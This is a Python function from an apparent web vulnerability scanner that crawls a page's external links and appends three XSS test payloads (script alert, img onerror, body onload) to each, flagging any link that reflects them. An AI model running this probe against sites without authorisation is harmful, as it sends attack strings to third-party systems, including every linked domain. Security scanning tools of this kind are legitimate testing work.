from ...handler.retry.retryrequest import RetryRequest
from ...config import Config
from messages import SuccessMessages
from bs4 import BeautifulSoup
import requests

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

def search_and_test_xss(url: str):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<body onload='alert(1)'>"]
    try:
        response_xss = retry_request.retry(requests.get, url, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}, allow_redirects=False)
    except Exception as e:
        print(f"Error making request to {url}: {e}")
        return
    soup = BeautifulSoup(response_xss.text, 'html.parser')
    links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http')]
    for link in links:
        for payload in xss_payloads:
            test_link = link + payload
            try:
                response = retry_request.retry(requests.get, test_link, timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()}, allow_redirects=False)
            except Exception as e:
                print(f"Error testing payload on {link}: {e}")
                continue
            if payload in response.text:
                print(f"{SuccessMessages.FOUND_XSS} in {link}")
                break  # Stop testing other payloads if XSS is found in this link

